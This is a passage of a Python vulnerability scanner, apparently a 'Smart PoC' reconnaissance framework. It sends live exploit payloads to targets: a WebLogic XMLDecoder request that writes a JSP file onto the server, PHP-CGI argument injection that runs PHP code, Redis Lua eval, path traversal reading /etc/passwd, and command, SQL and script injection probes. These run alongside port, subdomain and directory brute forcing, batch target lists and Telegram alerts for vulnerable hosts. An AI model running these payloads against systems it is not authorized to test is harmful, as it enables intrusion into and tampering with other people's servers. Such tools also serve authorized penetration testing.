                "details": f"WAF blocked ({err})", "method": "elasticsearch_groovy_rce", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and ("uid=" in r.text or "gid=" in r.text):
            return {"target": url, "vulnerability": "CVE-2015-1427", "type": "cve", "status": "vulnerable",
                "details": "Groovy RCE confirmed (uid= in response)", "method": "elasticsearch_groovy_rce", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2015-1427", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "elasticsearch_groovy_rce", "timestamp": datetime.now().isoformat()}

    def check_redis_cve_2022_0543(self, url, context=None):
        host = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((host, 6379))
            s.send(b"eval 'return 7*7' 0\r\n")
            resp = s.recv(1024).decode("utf-8", errors="ignore")
            s.close()
            if "49" in resp:
                return {"target": host, "vulnerability": "CVE-2022-0543", "type": "cve", "status": "vulnerable",
                    "details": "Lua sandbox escape confirmed (7*7=49)", "method": "redis_lua_rce", "timestamp": datetime.now().isoformat()}
            return {"target": host, "vulnerability": "CVE-2022-0543", "type": "cve", "status": "not_vulnerable",
                "details": "Redis not vulnerable", "method": "redis_lua_rce", "timestamp": datetime.now().isoformat()}
        except Exception as e:
            return {"target": host, "vulnerability": "CVE-2022-0543", "type": "cve", "status": "error",
                "details": str(e), "method": "redis_lua_rce", "timestamp": datetime.now().isoformat()}

    def check_weblogic_cve_2017_10271(self, url, context=None):
        check_url = url.rstrip("/") + "/wls-wsat/CoordinatorPortType"
        payload = '<?xml version="1.0" encoding="utf-8"?><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><java version="1.4.0" class="java.beans.XMLDecoder"><object class="java.io.PrintWriter"><string>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</string><void method="println"><string>7*7=49</string></void><void method="close"/></object></java></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>'
        headers = {"Content-Type": "text/xml"}
        r, err = self._safe_request("post", check_url, data=payload, headers=headers)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2017-10271", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "weblogic_wls_wsat_rce", "timestamp": datetime.now().isoformat()}
        if r and r.status_code in (200, 202):
            test_url = url.rstrip("/") + "/bea_wls_internal/test.jsp"
            r2, err2 = self._safe_request("get", test_url)
            if r2 and "49" in r2.text:
                return {"target": url, "vulnerability": "CVE-2017-10271", "type": "cve", "status": "vulnerable",
                    "details": "WLS-WSAT RCE confirmed (test.jsp created)", "method": "weblogic_wls_wsat_rce", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2017-10271", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "weblogic_wls_wsat_rce", "timestamp": datetime.now().isoformat()}

    def check_nexus_cve_2019_7238(self, url, context=None):
        check_url = url.rstrip("/") + "/service/rest/beta/repositories/go/group"
        payload = '{"name": "internal", "online": true, "storage": {"blobStoreName": "default", "strictContentTypeValidation": true}, "group": {"memberNames": ["${7*7}"]}}'
        headers = {"Content-Type": "application/json"}
        r, err = self._safe_request("post", check_url, data=payload, headers=headers)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2019-7238", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "nexus_el_rce", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 400 and "49" in r.text:
            return {"target": url, "vulnerability": "CVE-2019-7238", "type": "cve", "status": "vulnerable",
                "details": "EL injection confirmed (7*7=49)", "method": "nexus_el_rce", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2019-7238", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "nexus_el_rce", "timestamp": datetime.now().isoformat()}

    def check_gitlab_cve_2021_22205(self, url, context=None):
        check_url = url.rstrip("/") + "/users/sign_in"
        r, err = self._safe_request("get", check_url)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2021-22205", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "gitlab_exif_rce_check", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and "GitLab" in r.text:
            return {"target": url, "vulnerability": "CVE-2021-22205", "type": "cve", "status": "vulnerable",
                "details": "GitLab detected -- may be vulnerable to ExifTool RCE", "method": "gitlab_exif_rce_check", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2021-22205", "type": "cve", "status": "not_vulnerable",
                "details": "GitLab not detected", "method": "gitlab_exif_rce_check", "timestamp": datetime.now().isoformat()}

    def check_grafana_cve_2021_43798(self, url, context=None):
        check_url = url.rstrip("/") + "/public/plugins/alertlist/../../../../../../../../etc/passwd"
        r, err = self._safe_request("get", check_url)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2021-43798", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "grafana_path_traversal", "timestamp": datetime.now().isoformat()}
        if r and r.status_code == 200 and "root:" in r.text:
            return {"target": url, "vulnerability": "CVE-2021-43798", "type": "cve", "status": "vulnerable",
                "details": "Read /etc/passwd via plugin path traversal", "method": "grafana_path_traversal", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2021-43798", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r else 'error'}", "method": "grafana_path_traversal", "timestamp": datetime.now().isoformat()}

    def check_sqli(self, url):
        # Дифференциальная: ошибка СУБД должна появиться только с payload
        # (бенчмарк-пары AND 1=1 / AND 1=2 с разным ответом = инъекция).
        sql_error_patterns = [
            re.compile(r"SQL syntax.*?MySQL|MySQLSyntaxErrorException", re.I),
            re.compile(r"Warning:\s*mysql_|mysqli?_", re.I),
            re.compile(r"ORA-\d{4,5}:", re.I),
            re.compile(r"PostgreSQL.*?ERROR|pg_query\(\)", re.I),
            re.compile(r"SQLite/JDBCDriverException|sqlite3\.OperationalError", re.I),
            re.compile(r"Microsoft OLE DB Provider for SQL Server|Unclosed quotation mark", re.I),
        ]
        baseline, _ = self._safe_request("get", url)
        baseline_text = (baseline.text or "") if baseline is not None else ""
        base_len = len(baseline_text)
        r_err, err = self._safe_request("get", f"{url}?id=1'")
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "SQL Injection", "type": "generic", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "sqli_test", "timestamp": datetime.now().isoformat()}
        if r_err is not None:
            for pat in sql_error_patterns:
                if pat.search(r_err.text) and not pat.search(baseline_text):
                    return {"target": url, "vulnerability": "SQL Injection", "type": "generic", "status": "vulnerable",
                        "details": f"SQL error only with payload ({pat.pattern[:40]})",
                        "method": "sqli_test", "timestamp": datetime.now().isoformat()}
        # Boolean-based: разные размеры ответа при true/false
        r_t, _ = self._safe_request("get", f"{url}?id=1 AND 1=1")
        r_f, _ = self._safe_request("get", f"{url}?id=1 AND 1=2")
        if r_t is not None and r_f is not None:
            lt, lf = len(r_t.text), len(r_f.text)
            # разница > 50 байт между true/false при стабильном baseline
            if abs(lt - lf) > 50 and abs(base_len - lt) < abs(lt - lf):
                return {"target": url, "vulnerability": "SQL Injection", "type": "generic", "status": "vulnerable",
                    "details": f"Boolean-based differential: true={lt}B, false={lf}B",
                    "method": "sqli_test", "timestamp": datetime.now().isoformat()}
        return None

    def check_xss(self, url):
        test_url = f"{url}?q=<script>alert('XSS')</script>"
        r, err = self._safe_request("get", test_url)
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "XSS", "type": "generic", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "xss_test", "timestamp": datetime.now().isoformat()}
        if r and "<script>alert('XSS')</script>" in r.text:
            return {"target": url, "vulnerability": "XSS", "type": "generic", "status": "vulnerable",
                "details": "Unfiltered script tag reflected", "method": "xss_test", "timestamp": datetime.now().isoformat()}
        return None

    def check_lfi(self, url):
        test_urls = [f"{url}?file=../../../../../../etc/passwd", f"{url}?page=../../../../../../etc/passwd"]
        for test_url in test_urls:
            r, err = self._safe_request("get", test_url)
            if err and "blocked" in err:
                return {"target": url, "vulnerability": "LFI", "type": "generic", "status": "blocked",
                    "details": f"WAF blocked ({err})", "method": "lfi_test", "timestamp": datetime.now().isoformat()}
            if r and "root:" in r.text:
                return {"target": url, "vulnerability": "LFI", "type": "generic", "status": "vulnerable",
                    "details": f"Read /etc/passwd via LFI", "method": "lfi_test", "timestamp": datetime.now().isoformat()}
        return None

    def check_rce(self, url):
        # Дифференциальная проверка: маркер должен появиться ТОЛЬКО с payload,
        # и это должен быть реальный вывод команды (uid=1000(x) gid=…),
        # а не слово "root" в обычной странице.
        baseline, _ = self._safe_request("get", url)
        baseline_text = (baseline.text or "") if baseline is not None else ""
        id_re = re.compile(r"uid=\d+\([a-z_][\w-]*\)\s+gid=\d+\([a-z_][\w-]*\)")
        whoami_re = re.compile(r"^[\w.-]*(www-data|apache2?|nginx|daemon|nobody)[\w.-]*$", re.MULTILINE)
        for param, payload, marker_re, marker_desc in [
            ("cmd", "id", id_re, "uid/gid output"),
            ("exec", "whoami", whoami_re, "whoami output"),
        ]:
            test_url = f"{url}?{param}={payload}"
            r, err = self._safe_request("get", test_url)
            if err and "blocked" in err:
                return {"target": url, "vulnerability": "RCE", "type": "generic", "status": "blocked",
                    "details": f"WAF blocked ({err})", "method": "rce_test", "timestamp": datetime.now().isoformat()}
            if r is not None and marker_re.search(r.text) and not marker_re.search(baseline_text):
                return {"target": url, "vulnerability": "RCE", "type": "generic", "status": "vulnerable",
                    "details": f"Command output detected ({marker_desc}), differential vs baseline",
                    "method": "rce_test", "timestamp": datetime.now().isoformat()}
        return None

    def check_php_cgi_cve_2012_1823(self, url, context=None):
        # Классический PHP-CGI argument injection: автопрепенд php://input.
        # Маркер подтверждает выполнение, а не просто отражение запроса.
        marker = hashlib.md5(str(random.random()).encode()).hexdigest()
        payload = f"<?php echo '{marker}'; ?>"
        check_url = url.rstrip("/") + "/?-d+allow_url_include%3D1+-d+auto_prepend_file%3Dphp://input"
        r, err = self._safe_request("post", check_url, data=payload,
                                    headers={"Content-Type": "application/octet-stream"})
        if err and "blocked" in err:
            return {"target": url, "vulnerability": "CVE-2012-1823", "type": "cve", "status": "blocked",
                "details": f"WAF blocked ({err})", "method": "php_cgi_injection",
                "timestamp": datetime.now().isoformat()}
        if r and marker in r.text:
            return {"target": url, "vulnerability": "CVE-2012-1823", "type": "cve", "status": "vulnerable",
                "details": "PHP code executed via CGI argument injection (marker echoed)",
                "method": "php_cgi_injection", "timestamp": datetime.now().isoformat()}
        return {"target": url, "vulnerability": "CVE-2012-1823", "type": "cve", "status": "not_vulnerable",
                "details": f"Response: {r.status_code if r is not None else 'error'}",
                "method": "php_cgi_injection", "timestamp": datetime.now().isoformat()}

# ═══════════════════════════════════════════════════════════════════════════════
# MAIN
# ═══════════════════════════════════════════════════════════════════════════════
def build_arg_parser():
    parser = argparse.ArgumentParser(description="Reconnaissance Framework v3.0 -- Smart PoC")
    parser.add_argument("target", nargs="?", default=None, help="IP or domain (или используйте --targets)")
    parser.add_argument("--output-dir", default="recon_results", help="Output directory")
    parser.add_argument("--wordlist", default="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt", help="Wordlist")
    parser.add_argument("--vhost-wordlist", default="/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt", help="VHost wordlist")
    parser.add_argument("--threads", type=int, default=50, help="Threads")
    parser.add_argument("--no-color", action="store_true", help="Disable colors")
    parser.add_argument("--skip-nuclei", action="store_true", help="Skip Nuclei")
    parser.add_argument("--skip-poc", action="store_true", help="Skip PoC verification")
    parser.add_argument("--hard-mode", action="store_true", help="Hard mode (subdomains + vhosts)")
    parser.add_argument("--token-2ip", default=None, help="2ip.io API token")
    parser.add_argument("--github-token", default=None, help="GitHub API token for PoC search")
    parser.add_argument("--vulners-api-key", default=None, help="Vulners API key")
    parser.add_argument("--format", choices=["json", "csv", "all"], default="all", help="Output format: json, csv, or all")
    parser.add_argument("--format-html", action="store_true", help="Also generate HTML report")
    parser.add_argument("--dir-timeout", type=int, default=900, help="Directory brute force timeout (seconds)")
    parser.add_argument("--resume", action="store_true", help="Resume from saved state (.resume_state_TARGET.json)")
    parser.add_argument("--nvd-api-key", default=os.environ.get("NVD_API_KEY"), help="NVD API key (range checks)")
    parser.add_argument("--sqlmap", action="store_true", help="Confirm SQLi with sqlmap (active scanning)")
    parser.add_argument("--aggressive", action="store_true", help="Check everything with confidence >= 40 (safe checks)")
    parser.add_argument("--wp-token", default=os.environ.get("WPSCAN_API_TOKEN"), help="WPScan API token (plugin vulns)")
    parser.add_argument("--skip-wp", action="store_true", help="Skip WordPress fingerprinting")
    parser.add_argument("--targets", default=None, help="File with targets: CSV (наш формат разведки) или список по строке")
    parser.add_argument("--only-site", action="store_true", help="From CSV: only targets with has_site=true")
    parser.add_argument("--only-wordpress", action="store_true", help="From CSV: only WordPress targets")
    parser.add_argument("--only-server", action="store_true", help="From CSV: only targets with server header")
    parser.add_argument("--notify", default=None, help="Telegram: BOT_TOKEN:CHAT_ID (или TG_BOT_TOKEN/TG_CHAT_ID)")
    parser.add_argument("--notify-vulnerable", action="store_true", help="Notify only when scan finds vulnerabilities")
    parser.add_argument("--notify-threshold", type=int, default=70,
                        help="Confidence threshold (0-100) for useful-finding notifications (default 70)")
    parser.add_argument("--batch-threads", type=int, default=1,
                        help="Parallel scans in batch mode (1-5, default 1)")
    parser.add_argument("--rate-limit", type=int, default=None,
                        help="Max HTTP requests/sec (global, all scans). Default: no limit")
    return parser


def run_single_scan(args, target, notifier=None):
    """Один прогон по одной цели (тело прежнего main())."""
    args.target = target

    if args.no_color:
        Colors.disable()

    log_section("RECONNAISSANCE FRAMEWORK v3.0 -- SMART PoC")
    print(f"  Target:    {Colors.BOLD}{args.target}{Colors.ENDC}")
    print(f"  Output:    {Colors.OKCYAN}{args.output_dir}{Colors.ENDC}")
    print(f"  Threads:   {Colors.OKCYAN}{args.threads}{Colors.ENDC}")
    print(f"  Hard mode: {Colors.OKCYAN}{args.hard_mode}{Colors.ENDC}")
    print(f"  Nuclei:    {Colors.OKCYAN}{'SKIP' if args.skip_nuclei else 'YES'}{Colors.ENDC}")
    print(f"  PoC:       {Colors.OKCYAN}{'SKIP' if args.skip_poc else 'YES'}{Colors.ENDC}")
    print(f"  2ip token: {Colors.OKCYAN}{'YES' if args.token_2ip else 'NO'}{Colors.ENDC}")
    print(f"  GitHub:    {Colors.OKCYAN}{'YES' if args.github_token else 'NO'}{Colors.ENDC}")
    print(f"  Vulners:   {Colors.OKCYAN}{'YES' if args.vulners_api_key else 'NO (public)'}{Colors.ENDC}")
    print()

    check_deps()
    os.makedirs(args.output_dir, exist_ok=True)

    resume_state = load_resume_state(args.output_dir, target) if args.resume else None
    if resume_state:
        log_success(f"[Resume] Restoring scan from stage '{resume_state.get('stage')}' "
                    f"({resume_state.get('updated')})")
    else:
        resume_state = None

    target = args.target
    is_ip_target = is_ip(target)
    ip = target if is_ip_target else resolve_ip(target)
    domain = target if not is_ip_target else None

    if not ip:
        log_error(f"Cannot resolve {target}")
        sys.exit(1)

    # Initialize new engines
    vulners_engine = VulnersEngine(api_key=args.vulners_api_key)
    epss_kev = EPSSKEVClient()
    github_finder = GitHubPoCFinder(token=args.github_token)
    poc_verifier = PoCVerifier(vulners_engine, epss_kev, github_finder)
    poc_verifier.confidence.nvd = NVDRangesClient(api_key=args.nvd_api_key)
    poc_verifier.aggressive = bool(args.aggressive)
    sqlmap_scanner = SQLMapScanner(args.output_dir)

    def save_stage(stage, payload):
        save_resume_state(args.output_dir, target, stage, payload, args)

    # OS Detection
    log_section("OS DETECTION")
    if resume_state and (resume_state.get("results", {}) or {}).get("os"):
        os_info = resume_state["results"]["os"]
    else:
        os_info = os_guess_by_ttl(ip)
    if os_info:
        log_success(f"[OS] {os_info['name']}")
    else:
        log_warning("[OS] Could not detect via TTL")

    # Domain Resolver
    domains = []
    if is_ip_target:
        resolver = DomainResolver(token_2ip=args.token_2ip)
        domains = resolver.resolve(ip)
        if domains:
            domain = domains[0]
            log_success(f"[Resolver] Primary domain: {domain}")
        else:
            log_warning("[Resolver] No domains found, using IP for all scans")
            domain = None
    else:
        domains = [domain]

    # Banner grab for key ports (параллельно)
    log_section("BANNER GRAB")
    key_ports = [21, 22, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 5432, 6379, 8080, 8443, 9000, 9200, 27017]
    banners = banner_grab_ports(ip, key_ports)


    # Fallback wordlists: не падаем, если дефолтного файла нет
    wordlist = find_first_existing([
        args.wordlist,
        "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
    ])
    if wordlist != args.wordlist:
        log_warning(f"[Wordlist] Default not found, using: {wordlist or 'none (dir scan skipped)'}")
    vhost_wordlist = find_first_existing([
        args.vhost_wordlist,
        "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        "/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt",
        "/usr/share/wordlists/dirb/common.txt",
    ])
    if vhost_wordlist != args.vhost_wordlist:
        log_warning(f"[VHost wordlist] Default not found, using: {vhost_wordlist or 'none (vhost scan skipped)'}")

    # Nmap
    log_section("NMAP SCAN")
    if resume_state and (resume_state.get("results", {}) or {}).get("detailed_ports") is not None:
        rs = resume_state["results"]
        open_ports = rs.get("ports", [])
        detailed = {"ports": rs.get("detailed_ports", []), "os": rs.get("nmap_os"),
                    "cpe_cves": rs.get("cpe_cves", [])}
        log_info(f"[Resume] Using saved nmap results: {len(open_ports)} ports")
        nmap = NmapScanner()
    else:
        nmap = NmapScanner()
        open_ports = nmap.scan_ports(ip)
        if not open_ports:
            log_warning("No open ports found")
        detailed = nmap.detailed_scan(ip, open_ports)
        save_stage("nmap", {"ports": open_ports, "detailed_ports": detailed.get("ports", []),
                            "nmap_os": detailed.get("os"), "cpe_cves": detailed.get("cpe_cves", []),
                            "os": os_info})
    detailed_ports = detailed.get("ports", [])
    cpe_cves = detailed.get("cpe_cves", [])
    nmap_os = detailed.get("os")
    if nmap_os:
        log_success(f"[Nmap OS] {nmap_os['name']} (accuracy: {nmap_os['accuracy']})")
        os_info = nmap_os

    # MySQL handshake: точная версия сервера из greeting-пакета
    if 3306 in open_ports:
        mysql_ver = mysql_fingerprint(ip, 3306)
        if mysql_ver:
            log_success(f"[MySQL] Handshake version: {mysql_ver}")
            for p in detailed_ports:
                if str(p.get("port")) == "3306":
                    svc = p.setdefault("service", {})
                    if not svc.get("version"):
                        svc["product"] = "MySQL"; svc["version"] = mysql_ver
                    banners[3306] = {"raw": f"MySQL {mysql_ver}", "product": "MySQL",
                                     "version": mysql_ver, "clean": f"MySQL {mysql_ver}"}
        else:
            log_info("[MySQL] Handshake not readable (прокси/защита?)")

    # Merge banner data into detailed ports
    for p in detailed_ports:
        port_num = int(p["port"]) if str(p.get("port", "")).isdigit() else 0
        if port_num in banners:
            p["service"]["banner"] = banners[port_num]["raw"]
            if not p["service"].get("product") and banners[port_num]["product"]:
                p["service"]["product"] = banners[port_num]["product"]
            if not p["service"].get("version") and banners[port_num]["version"]:
                p["service"]["version"] = banners[port_num]["version"]

    # Subdomains
    log_section("SUBDOMAIN ENUMERATION")
    all_subdomains = set()
    if domain:
        sub_scanner = SubdomainScanner()
        def on_sub(sub):
            all_subdomains.add(sub)
            log_info(f"  [Subfinder] {sub}")
        sub_scanner.scan_stream(domain, on_sub)
    else:
        log_warning("No domain for subdomain enumeration")

    # DNS
    log_section("DNS ENUMERATION")
    dns = DNSEnum()
    dns_results = dns.enum(domain) if domain else {}
    if not dns_results:
        log_warning("No DNS records")

    # URL list for Nuclei
    urls_to_scan = []
    if domain:
        urls_to_scan.append(f"http://{domain}")
        urls_to_scan.append(f"https://{domain}")
    urls_to_scan.append(f"http://{ip}")
    urls_to_scan.append(f"https://{ip}")

    # Tech detection
    log_section("TECHNOLOGY DETECTION")
    tech = TechDetector()
    tech_results = {}
    for url in urls_to_scan[:2]:
        result = tech.detect(url)
        tech_results[url] = result
        # Если первая схема отработала, вторую не мучаем (whatweb медленный)
        if result and result not in ("Unknown",) and not str(result).startswith("Error"):
            break

    # Directory brute force
    log_section("DIRECTORY BRUTE FORCE")
    dir_scanner = DirectoryScanner(wordlist, threads=args.threads)
    dir_results = {}
    for url in urls_to_scan[:2]:
        results = dir_scanner.scan(url, label=url, timeout=args.dir_timeout)
        if results:
            dir_results[url] = results

    # Leak check
    log_section("SENSITIVE FILE LEAK CHECK")
    leak_checker = LeakChecker()
    leak_results = {}
    for url in urls_to_scan[:2]:
        results = leak_checker.check(url)
        if results:
            leak_results[url] = results

    # CORS
    log_section("CORS MISCONFIGURATION CHECK")
    cors_checker = CORSCheker()
    cors_results = {}
    for url in urls_to_scan[:2]:
        results = cors_checker.check(url)
        if results:
            cors_results[url] = results

    # WordPress fingerprint + wpscan
    wp_results = {}
    if not args.skip_wp:
        log_section("WORDPRESS CHECK")
        wp_scanner = WordPressScanner()
        for url in urls_to_scan[:2]:
            wp_info = wp_scanner.detect(url)
            is_wp = bool(wp_info.get("version") or wp_info.get("theme") or
                         any("wp-" in l.get("path", "") for l in (leak_results.get(url) or [])))
            if is_wp:
                log_success(f"[WP] WordPress detected: version={wp_info.get('version')}, "
                            f"theme={wp_info.get('theme')}, plugins={wp_info.get('plugins')}")
                # Без токена wpscan не показывает уязвимости плагинов/тем —
                # не тратим ~5 минут на пустой запуск.
                wp_data = wp_scanner.wpscan(url) if args.wp_token else None
                if not args.wp_token:
                    log_info("[WP] wpscan пропущен: нет --wp-token (версии плагинов "
                             "и их CVE показывает только wpscan с API-токеном)")
                wp_results[url] = {"fingerprint": wp_info, "wpscan": wp_data}
        if not wp_results:
            log_info("[WP] WordPress not detected")

    # SSL
    log_section("SSL/TLS SCAN")
    ssl_scanner = SSLScanner()
    ssl_results = {}
    for url in urls_to_scan[:2]:
        host = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
        port = 443
        if ":" in url.replace("http://", "").replace("https://", ""):
            try:
                port = int(url.split(":")[-1].split("/")[0])
            except:
                pass
        results = ssl_scanner.scan(host, port)
        if results:
            ssl_results[url] = results

    # Favicon
    log_section("FAVICON EXTRACTION")
    favicon = FaviconExtractor()
    favicon_results = {}
    for url in urls_to_scan[:2]:
        result = favicon.extract(url)
        if result:
            favicon_results[url] = result
            log_success(f"  {url}: MD5={result['md5']}, Size={result['size']} bytes")

    # Nuclei
    nuclei_results = None
    if not args.skip_nuclei:
        log_section("NUCLEI SCAN")
        nuclei = NucleiScanner()
        nuclei_results = nuclei.scan_urls(urls_to_scan, args.output_dir, threads=args.threads)
        save_stage("nuclei", {"ports": open_ports, "detailed_ports": detailed_ports,
                              "nmap_os": nmap_os, "cpe_cves": cpe_cves, "os": os_info,
                              "nuclei": nuclei_results or []})
    else:
        log_warning("[Nuclei] Skipped")

    # Searchsploit
    log_section("EXPLOIT SEARCH (Searchsploit)")
    exploit_finder = ExploitFinder()
    exploits = exploit_finder.scan_services(detailed_ports)

    # Metasploit
    log_section("METASPLOIT MODULE SEARCH")
    msf_finder = MetasploitFinder()
    metasploit = msf_finder.scan_services(detailed_ports)
    save_stage("exploits", {"ports": open_ports, "detailed_ports": detailed_ports,
                            "nmap_os": nmap_os, "cpe_cves": cpe_cves, "os": os_info,
                            "nuclei": (nuclei_results or []),
                            "exploits": exploits, "metasploit": metasploit})

    # Hard mode
    hard_mode_subdomains = {}
    if args.hard_mode and domain:
        log_section("HARD MODE: VHOST BRUTE FORCE")
        vhost_scanner = VHostScanner(vhost_wordlist, threads=args.threads)
        vhost_results = vhost_scanner.scan(ip, domain, scheme="http")
        if vhost_results:
            log_success(f"[VHost] Found {len(vhost_results)} virtual hosts")
            for vhost in vhost_results[:10]:
                vhost_name = vhost["vhost"]
                log_info(f"  Scanning {vhost_name}...")
                vhost_ip = resolve_ip(vhost_name)
                if not vhost_ip:
                    vhost_ip = ip
                vhost_ports = nmap.scan_ports(vhost_ip)
                vhost_detailed = nmap.detailed_scan(vhost_ip, vhost_ports)
                vhost_exploits = exploit_finder.scan_services(vhost_detailed.get("ports", []))
                vhost_msf = msf_finder.scan_services(vhost_detailed.get("ports", []))
                hard_mode_subdomains[vhost_name] = {
                    "domain": vhost_name, "ip": vhost_ip,
                    "ports": vhost_ports, "detailed": vhost_detailed.get("ports", []),
                    "os": vhost_detailed.get("os"), "exploits": vhost_exploits,
                    "metasploit": vhost_msf, "cpe_cves": vhost_detailed.get("cpe_cves", [])
                }

    # PoC Verification
    poc_results = None
    if not args.skip_poc:
        log_section("PoC VERIFICATION")
        # Prefetch диапазонов NVD для всех известных CVE (один пул запросов)
        try:
            nvd_cves = {item.get("cve") for item in (cpe_cves or []) if isinstance(item, dict) and item.get("cve")}
            for finding in (nuclei_results or []):
                if isinstance(finding, dict):
                    cve = finding.get("cve") or finding.get("template-id") or finding.get("templateID")
                    if cve and "CVE-" in str(cve).upper():
                        nvd_cves.add(str(cve).upper())
            if nvd_cves:
                poc_verifier.confidence.nvd.prefetch(nvd_cves)
        except Exception:
            pass
        scan_data = {
            "main": {
                "target": target, "domain": domain, "ip": ip,
                "ports": open_ports, "detailed": detailed_ports,
                "os": os_info, "exploits": exploits,
                "metasploit": metasploit, "cpe_cves": cpe_cves
            },
            "subdomains": {},
            "hard_mode_subdomains": hard_mode_subdomains,
            "nuclei_findings": nuclei_results or []
        }
        poc_results = poc_verifier.verify_all(scan_data)
        save_stage("poc", {"poc_results": poc_results})
    else:
        log_warning("[PoC] Skipped")

    # sqlmap: подтверждение SQLi (только при --sqlmap)
    sqlmap_results = None
    if args.sqlmap and sqlmap_scanner.available:
        log_section("SQLMAP CONFIRMATION")
        sqlmap_results = []
        for url in urls_to_scan[:2]:
            log_info(f"[SQLMap] {url}")
            res = sqlmap_scanner.scan(url)
            if res:
                res["label"] = "sqlmap"
                if res["status"] == "vulnerable":
                    log_success(f"[SQLMap] {url}: VULNERABLE — {res['details']}")
                sqlmap_results.append(res)

    # Save results
    log_section("SAVING RESULTS")
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    results = {
        "timestamp": timestamp,
        "target": target,
        "ip": ip,
        "domain": domain,
        "all_domains": domains,
        "os": os_info,
        "banners": banners,
        "ports": open_ports,
        "detailed_ports": detailed_ports,
        "cpe_cves": cpe_cves,
        "subdomains": sorted(all_subdomains),
        "dns": dns_results,
        "technology": tech_results,
        "directories": dir_results,
        "leaks": leak_results,
        "cors": cors_results,
        "wordpress": wp_results,
        "ssl": ssl_results,
        "favicons": favicon_results,
        "nuclei": nuclei_results,
        "exploits": exploits,
        "metasploit": metasploit,
        "hard_mode_subdomains": hard_mode_subdomains,
        "poc_results": poc_results
    }
    if sqlmap_results is not None:
        results["sqlmap"] = sqlmap_results

    save_json = args.format in ("json", "all")
    save_csv = args.format in ("csv", "all")

    if save_json:
        json_file = f"{args.output_dir}/recon_{target}_{timestamp}.json"
        with open(json_file, "w", encoding="utf-8") as f:
            json.dump(results, f, indent=2, ensure_ascii=False, default=str)
        log_success(f"[Save] JSON: {json_file}")

    # HTML-отчёт с сортировкой PoC-проверок по confidence
    if args.format_html or args.format in ("all", "json", "csv"):
        html_file = f"{args.output_dir}/recon_{target}_{timestamp}.html"
        generate_html_report(results, poc_results, html_file)

    if save_csv:
        csv_file = f"{args.output_dir}/recon_{target}_{timestamp}.csv"
        with open(csv_file, "w", newline="", encoding="utf-8") as f:
            writer = csv.writer(f)
            writer.writerow(["Port", "Protocol", "State", "Service", "Product", "Version", "CPEs", "Banner"])
            for p in detailed_ports:
                svc = p.get("service", {})
                cpes = ", ".join(svc.get("cpes", []))
                writer.writerow([p["port"], p["protocol"], p["state"], svc.get("name", ""),
                              svc.get("product", ""), svc.get("version", ""), cpes,
                              svc.get("banner", "")[:100]])
        log_success(f"[Save] CSV: {csv_file}")

        # PoC CSV
        if poc_results:
            poc_csv = f"{args.output_dir}/poc_{target}_{timestamp}.csv"
            with open(poc_csv, "w", newline="", encoding="utf-8") as f:
                writer = csv.writer(f)
                writer.writerow(["Target", "Vulnerability", "Type", "Status", "Details", "Method", "Confidence", "EPSS", "KEV", "Label", "Timestamp"])
                for check in poc_results.get("main", []):
                    writer.writerow([check.get("target", ""), check.get("vulnerability", ""), check.get("type", ""),
                                    check.get("status", ""), check.get("details", ""), check.get("method", ""),
                                    check.get("confidence", ""), check.get("epss", ""), check.get("kev", ""),
                                    check.get("label", ""), check.get("timestamp", "")])
                for sub, checks in poc_results.get("subdomains", {}).items():
                    for check in checks:
                        writer.writerow([check.get("target", ""), check.get("vulnerability", ""), check.get("type", ""),
                                        check.get("status", ""), check.get("details", ""), check.get("method", ""),
                                        check.get("confidence", ""), check.get("epss", ""), check.get("kev", ""),
                                        check.get("label", ""), check.get("timestamp", "")])
                for sub, checks in poc_results.get("hard_mode_subdomains", {}).items():
                    for check in checks:
                        writer.writerow([check.get("target", ""), check.get("vulnerability", ""), check.get("type", ""),
                                        check.get("status", ""), check.get("details", ""), check.get("method", ""),
                                        check.get("confidence", ""), check.get("epss", ""), check.get("kev", ""),
                                        check.get("label", ""), check.get("timestamp", "")])
            log_success(f"[Save] PoC CSV: {poc_csv}")

